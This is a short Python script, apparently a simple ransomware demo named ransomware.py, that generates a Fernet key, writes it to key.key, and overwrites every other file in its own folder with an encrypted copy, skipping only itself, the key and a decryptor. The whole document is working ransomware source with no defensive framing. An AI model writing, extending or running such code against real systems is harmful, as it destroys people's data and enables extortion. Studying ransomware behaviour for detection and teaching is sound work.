from cryptography.fernet import Fernet
from pathlib import Path
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
    return key

def encript_data(data, fernet):
    encrypted = fernet.encrypt(data)
    return key, encrypted

key = generate_key()
fernet = Fernet(key)

BASE_DIR = Path(__file__).resolve().parent
files = os.listdir(BASE_DIR)

black_list_files = ['key.key', 'ransomware.py', 'decrypt_data.py']
for filename in files:
    if filename not in black_list_files:
        with open(filename, 'rb') as file:
            file_data = file.read()
        key, encrypted = encript_data(file_data, fernet)

        with open(filename, 'wb') as file:
            file.write(encrypted)
